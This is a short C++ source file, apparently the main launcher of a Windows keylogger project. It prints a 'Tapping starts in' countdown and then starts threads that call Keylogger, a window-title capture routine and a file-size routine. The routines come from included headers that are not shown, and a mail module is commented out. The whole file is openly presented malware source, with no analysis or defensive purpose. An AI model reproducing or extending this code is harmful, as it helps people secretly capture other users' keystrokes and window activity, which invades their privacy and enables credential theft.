#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"
#include "filemanager.h"
// #include "mailmanager.h"
#include "winmanager.h"
#include "KeyLogger.h"
using namespace std;

int main()
{
    auto main = []() {
        printf("Running... \n");
        Keylogger(NULL);
        printf("terminated.. \n");
    };
    auto window = []() {
        wintitle();
    };
    auto filesize = []() {
        FSD();
    };
    HMODULE hModule = GetModuleHandle(nullptr);
    if (hModule != nullptr) {
        printf("\033[1;32m");
        Sleep(500);
        printf("Tapping starts in..\n");
        Sleep(1000);
        printf("3..\n");
        Sleep(1000);
        printf("2..\n");
        Sleep(1000);
        printf("1..\n");
        Sleep(1000);

        thread t1 = thread(main);
        thread t2 = thread(window);
        thread t3 = thread(filesize);
        t1.join();
        t2.join();
        t3.join();
    }
}